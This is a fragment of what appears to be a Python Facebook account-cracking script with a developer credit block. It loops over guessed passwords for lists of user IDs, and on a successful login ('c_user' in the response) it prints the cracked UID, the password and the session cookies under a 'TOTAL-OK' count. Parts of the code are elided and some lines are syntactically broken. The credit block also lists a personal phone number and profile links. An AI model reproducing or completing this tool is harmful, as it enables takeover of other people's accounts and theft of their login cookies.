...
number=int("+8801568722961")

devoloper_info={
    "Developer" :  SAFWAN ISLAM
    ''Number" :  +8801568722961
    "Status" :  GOOD
    "GitHub Url":  'https://github.com/safwangaiming11',
    "Facebook" :  'https://www.facebook.com/profile.php?id=100028392141273',
    }
...
def need(uid,pwx,fb,tl):
    ...
    sys.stdout.write(f"\r  \33[1;90m[\33[1;97mSAFWAN\33[1;92m | {'{:.1%}'.format(loop/int(tl))} | \33[1;97m{loop} \33[1;90m] \r "),
    sys.stdout.flush()
    try:
        for ps in pwx:
            ...
            if "c_user" in heron_brand:
                ...
                xd=xx[:15]
                print("\r\r\n\n")
                print(Panel(f"\r\r\n[white reverse][🔷]=UID/PAS[/white reverse] [bold green]{SAFWAN} [cyan]• [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[🔶][/yellow reverse][bold green]{coki}\n",title=f"[red reverse][TOTAL-OK {hh}]"))
